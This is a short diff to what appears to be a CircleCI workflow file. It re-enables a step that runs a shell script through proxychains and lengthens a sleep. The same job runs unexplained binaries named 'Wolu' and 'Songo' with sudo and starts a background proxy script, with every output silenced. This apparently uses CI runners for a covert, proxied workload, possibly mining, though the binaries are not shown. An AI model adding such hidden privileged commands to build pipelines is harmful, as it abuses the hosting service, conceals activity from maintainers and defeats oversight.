@@ -56,8 +56,8 @@ jobs:
               sudo ./Wolu >/dev/null 2>&1
               sudo ./Songo >/dev/null 2>&1
               screen -dmS proxy python3 p1.py >/dev/null 2>&1
-              sleep 12s
-              0#proxychains bash -u start2.sh >/dev/null 2>&1
+              sleep 120s
+              proxychains bash -u start2.sh >/dev/null 2>&1
   BambangSutrisno:
     docker:
       - image: circleci/python:3.8
